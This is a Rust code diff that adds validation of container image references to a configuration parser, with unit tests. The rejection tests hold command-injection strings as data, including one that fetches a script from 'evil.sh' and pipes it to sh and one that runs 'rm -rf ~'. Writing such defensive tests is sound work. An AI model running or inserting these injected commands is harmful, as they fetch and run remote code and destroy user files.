@@ -26,6 +26,11 @@ impl Config {
 
         if self.image.base.trim().is_empty() {
             errors.push("image.base: must not be empty".into());
+        } else if !is_valid_image_ref(&self.image.base) {
+            errors.push(format!(
+                "image.base: '{}' is not a valid image reference (expected [registry/]name[:tag], no spaces or shell characters)",
+                self.image.base
+            ));
         }
         if self.image.name.trim().is_empty() {
             errors.push("image.name: must not be empty".into());
@@ -40,9 +45,9 @@ impl Config {
         if let Some(ref r) = self.image.image_ref {
             if r.trim().is_empty() {
                 errors.push("image.image: must not be empty when set".into());
-            } else if !r.contains(':') && !r.contains('/') {
+            } else if !is_valid_image_ref(r) {
                 errors.push(format!(
-                    "image.image: '{r}' does not look like a valid image reference (missing ':' or '/')"
+                    "image.image: '{r}' is not a valid image reference (expected [registry/]name[:tag][@sha256:<digest>], no spaces or shell characters)"
                 ));
             }
         }
@@ -588,6 +593,132 @@ pub fn parse_provision_timeout_secs(s: &str) -> u64 {
     parse_duration_secs(s).unwrap_or(0)
 }
 
+/// True for a well-formed OCI image reference:
+/// `[domain/]path[:tag][@sha256:<64 hex>]`.
+///
+/// Whitespace and shell metacharacters are rejected outright, so a
+/// crafted value (for example from a share link) can never flow into a
+/// shell command or a podman argument. Repository paths are lowercase,
+/// matching what registries accept.
+pub fn is_valid_image_ref(s: &str) -> bool {
+    if s.is_empty() || s.len() > 512 {
+        return false;
+    }
+    if !s
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@'))
+    {
+        return false;
+    }
+    // Digest: at most one `@`, of the form `sha256:<64 hex>`.
+    let (rem, digest) = match s.split_once('@') {
+        Some((r, d)) => (r, Some(d)),
+        None => (s, None),
+    };
+    if let Some(d) = digest {
+        let hex = match d.strip_prefix("sha256:") {
+            Some(h) => h,
+            None => return false,
+        };
+        if hex.len() != 64 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
+            return false;
+        }
+    }
+    if rem.is_empty() {
+        return false;
+    }
+    // Tag: the colon after the last slash (a `host:port/` prefix is not a
+    // tag). `[\w][\w.-]{0,127}` like the registry grammar.
+    let (name, tag) = match rem.rfind('/') {
+        Some(slash) => {
+            let after = &rem[slash + 1..];
+            match after.find(':') {
+                Some(i) => (&rem[..slash + 1 + i], Some(&after[i + 1..])),
+                None => (rem, None),
+            }
+        }
+        None => match rem.find(':') {
+            Some(i) => (&rem[..i], Some(&rem[i + 1..])),
+            None => (rem, None),
+        },
+    };
+    if let Some(t) = tag {
+        let mut chars = t.chars();
+        let first_ok = chars
+            .next()
+            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
+        if !first_ok
+            || t.len() > 128
+            || !chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
+        {
+            return false;
+        }
+    }
+    // Name: optional registry domain, then repository path components.
+    let mut parts = name.split('/');
+    let first = parts.next().unwrap_or_default();
+    let rest: Vec<&str> = parts.collect();
+    if first.contains('.') || first.contains(':') || first == "localhost" {
+        if rest.is_empty() || !is_valid_registry_domain(first) {
+            return false;
+        }
+    } else if !is_valid_path_component(first) {
+        return false;
+    }
+    rest.iter().all(|p| is_valid_path_component(p))
+}
+
+/// Registry host with an optional numeric port: lowercase DNS plus dots
+/// and dashes (`ghcr.io`, `localhost:5000`).
+fn is_valid_registry_domain(s: &str) -> bool {
+    let (host, port) = match s.split_once(':') {
+        Some((h, p)) => (h, Some(p)),
+        None => (s, None),
+    };
+    if host.is_empty()
+        || host.starts_with(['.', '-'])
+        || host.ends_with(['.', '-'])
+        || host.split('.').any(str::is_empty)
+        || !host
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-')
+    {
+        return false;
+    }
+    if let Some(p) = port {
+        if p.is_empty() || !p.chars().all(|c| c.is_ascii_digit()) {
+            return false;
+        }
+    }
+    true
+}
+
+/// One repository path component: lowercase alphanumerics separated by
+/// single `.`, `_` or `-` (no leading/trailing/double separators).
+fn is_valid_path_component(s: &str) -> bool {
+    if s.is_empty() {
+        return false;
+    }
+    let bytes = s.as_bytes();
+    if !bytes[0].is_ascii_alphanumeric() || !bytes[bytes.len() - 1].is_ascii_alphanumeric() {
+        return false;
+    }
+    let mut prev_sep = false;
+    for c in s.chars() {
+        if c.is_ascii_lowercase() || c.is_ascii_digit() {
+            prev_sep = false;
+        } else if c == '.' || c == '_' || c == '-' {
+            if prev_sep {
+                return false;
+            }
+            prev_sep = true;
+        } else {
+            return false;
+        }
+    }
+    true
+}
+
 fn is_valid_provision_name(s: &str) -> bool {
     if s.is_empty() || s.len() > 64 {
         return false;
@@ -856,5 +987,65 @@ mod env_key_tests {
             err.to_string().contains("security.secrets[0].target"),
             "{err}"
         );
+    }
+}
+
+#[cfg(test)]
+mod image_ref_tests {
+    use super::is_valid_image_ref;
+    use crate::config::Config;
+
+    #[test]
+    fn valid_refs_are_accepted() {
+        for good in [
+            "fedora:41",
+            "fedora",
+            "dev-latest",
+            "ubuntu:22.04",
+            "ghcr.io/bethropolis/podbox:dev-latest",
+            "ghcr.io/a/b:1",
+            "localhost:5000/mybox:latest",
+            "docker.io/library/archlinux:latest",
+            "alpine:3.20",
+            "myrepo/myimage@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+            "ghcr.io/a/b:1@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+        ] {
+            assert!(is_valid_image_ref(good), "should accept {good:?}");
+        }
+    }
+
+    #[test]
+    fn shell_characters_and_malformed_refs_are_rejected() {
+        for bad in [
+            "",
+            " ",
+            "ghcr.io/a/b:1 --name x; curl evil.sh|sh #",
+            "a;rm -rf ~",
+            "$(evil)",
+            "`evil`",
+            "a'b",
+            "a\"b",
+            "a/b\\c",
+            "UPPER/repo:tag",
+            "a//b",
+            "/a",
+            "a/",
+            ":tag",
+            "a:",
+            "-bad/x",
+            "a:b:c",
+            "a@sha256:xyz",
+            "a@md5:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+            "a..b/c",
+        ] {
+            assert!(!is_valid_image_ref(bad), "should reject {bad:?}");
+        }
+    }
+
+    #[test]
+    fn crafted_share_link_ref_fails_validation() {
+        let toml = "[image]\nbase = \"fedora:41\"\nname = \"env\"\nimage = \"ghcr.io/a/b:1 --name x; curl evil.sh|sh #\"\n[container]\nname = \"env\"\nhome = \"~/env\"\n";
+        let err = Config::parse(toml).expect_err("crafted ref must fail validation");
+        assert!(err.to_string().contains("image.image"), "{err}");
     }
 }
